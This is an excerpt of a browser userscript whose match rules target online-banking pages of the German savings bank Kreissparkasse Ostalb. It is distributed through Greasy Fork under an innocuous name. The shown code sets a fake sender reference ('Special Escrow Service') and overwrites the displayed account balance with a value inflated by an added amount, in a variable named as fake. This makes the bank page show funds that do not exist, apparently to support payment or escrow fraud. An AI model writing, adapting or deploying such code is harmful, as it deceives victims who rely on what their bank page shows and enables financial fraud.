...
// @match        https://www.ksk-ostalb.de/de/home/onlinebanking/nbf/umsaetze.html*
// @match        https://www.ksk-ostalb.de/de/home/onlinebanking/nbf/finanzuebersicht.html*
// @match        https://www.ksk-ostalb.de/de/home/onlinebanking/nbf/banking/einzelauftrag.html*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/452456/Vertragssignature%20FINK.user.js
// @updateURL https://update.greasyfork.org/scripts/452456/Vertragssignature%20FINK.meta.js
// ==/UserScript==
...
(function() {
    ...
    var asenderReference = "WD3746 TRX88205A 88538 Special Escrow Service";
    ...
    //Wir sind in der Finanzuebersicht
        if (vorgemerkt == "no"){
            ...
            document.getElementsByClassName("balance-predecimal")[6].textContent = zwischenSummeNwc;
            var zwischenSumme = document.getElementsByClassName("balance-predecimal")[6].textContent;
            var zwischenSummeReal = zwischenSumme.replace(".", "");
            var zwischenSummeFake = parseFloat(zwischenSummeReal) + amount;
            var zwischenSummeNwc = numberWithCommas(zwischenSummeFake);
